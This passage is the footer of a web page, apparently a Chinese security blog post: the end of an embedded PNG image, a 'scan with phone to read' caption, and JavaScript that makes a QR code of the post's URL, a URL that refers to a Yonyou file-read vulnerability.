X7lndX3Zt3r0Yb6w12udPcozi/JWzHKlVe4rUTUVX6nRewxEYeNrb+A0EJ+qxKtj6tdXT0iFulhaRfKsk4tVUyG3foZ6Emfe0qpvRfqveNVU6Ktes8h81aziNBCLN77mBn48EJ8IJy5/9uPot9665Fd65a1JzD1WeX3VaxarutST20tdPtvvxwOx+cZ/cwM/HkhO3WM5ffNi6voT9aknV/8OZi/PJmbePb6qW3eF9i388UCuNtv5r93AaSA+JYlXbWu6FVlXWh/m1eTZf6XrM9+jOdE9kluzyqdfbp08cdXPusyr93gaSG6y+e/ewDEQp3eFV8fLeqdvnXn5CtNnH3Wxr0/NmsS+ptZZV9osVr5Vf3Xr5PZW7/EYiKaNr72BPZDX3v9p9/8BAAD//8rPi14AAAAGSURBVAMA9DKDtqolBlEAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-business-common-toviewspecial-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 